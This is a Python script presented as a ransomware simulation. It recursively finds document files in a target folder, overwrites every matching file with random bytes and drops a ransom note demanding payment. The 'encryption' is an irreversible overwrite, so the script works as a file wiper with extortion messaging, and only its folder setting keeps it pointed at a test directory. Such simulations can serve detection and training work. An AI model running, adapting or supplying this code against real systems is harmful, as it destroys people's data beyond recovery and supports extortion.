import os
import random
import time

# --- Configuration ---
TARGET_FOLDER = 'test_folder'
FILE_EXTENSIONS_TO_TARGET = ['.txt', '.docx', '.xlsx']
RANSOM_NOTE_FILENAME = '_readme.txt'
RANSOM_NOTE_CONTENT = """
All your files have been encrypted!
To get them back, you must pay us.
Contact us at get_your_files_back@email.com for instructions.
"""

def simulate_encryption(file_path):
    try:
        file_size = os.path.getsize(file_path)
        with open(file_path, 'wb') as f:
            random_data = os.urandom(file_size if file_size > 512 else 1024)
            f.write(random_data)
        print(f"[ATTACK] Encrypted: {os.path.basename(file_path)}")
    except Exception as e:
        print(f"[ERROR] Could not encrypt {file_path}: {e}")

def drop_ransom_note():
    note_path = os.path.join(TARGET_FOLDER, RANSOM_NOTE_FILENAME)
    try:
        with open(note_path, 'w') as f:
            f.write(RANSOM_NOTE_CONTENT)
        print(f"[ATTACK] Dropped ransom note: {RANSOM_NOTE_FILENAME}")
    except Exception as e:
        print(f"[ERROR] Could not drop ransom note: {e}")

def run_simulation():
    print(f"--- Advanced Ransomware Simulation Started on '{TARGET_FOLDER}' ---")
    if not os.path.exists(TARGET_FOLDER):
        print(f"[ERROR] Target folder '{TARGET_FOLDER}' not found.")
        return

    target_files = []
    for root, _, files in os.walk(TARGET_FOLDER):
        for file in files:
            if any(file.endswith(ext) for ext in FILE_EXTENSIONS_TO_TARGET):
                target_files.append(os.path.join(root, file))

    if not target_files:
        print("No target files found.")
        return
        
    print(f"Found {len(target_files)} files to target...")
    for file_path in target_files:
        simulate_encryption(file_path)
        time.sleep(0.1) # Short delay to make the attack feel more real

    drop_ransom_note()
    print(f"\n--- Simulation Complete ---")

if __name__ == "__main__":
    run_simulation()

